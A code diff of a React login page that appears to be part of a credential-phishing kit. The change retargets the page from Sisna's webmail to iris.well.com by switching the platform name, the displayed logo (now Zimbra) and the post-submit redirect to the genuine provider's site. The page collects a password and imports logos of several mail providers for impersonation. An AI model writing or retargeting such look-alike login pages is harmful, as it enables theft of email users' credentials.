@@ -10,6 +10,7 @@ import powerx from './powerx.png';
 import mediacom from './mediacom.png';
 import united from './united.png';
 import mrtc from './mrtc.png';
+import zimbra from './zimbra.png';
 
 
 function Home(){
@@ -18,7 +19,7 @@ function Home(){
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Sisna");
+    const[platform, setPlatform] = useState("Iris-well");
 
     const[showError, setShowError] = useState(false);
 
@@ -46,7 +47,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://mail.sisna.com/';
+               window.location.href = 'https://iris.well.com/';
             }
           } catch (error) {
             // Handle error
@@ -70,10 +71,8 @@ function Home(){
             </div>
 
             <div className='secondiv col-md-5 m-auto'>
-                <div className='logodiv px-3 text-center'>
-                <img src={mrtc} className="mylogo" style={{
-                    visibility:"hidden",
-                }}/>
+                <div className='logodiv px-3'>
+                <img src={zimbra} className="mylogo"/>
 
                 </div>
 
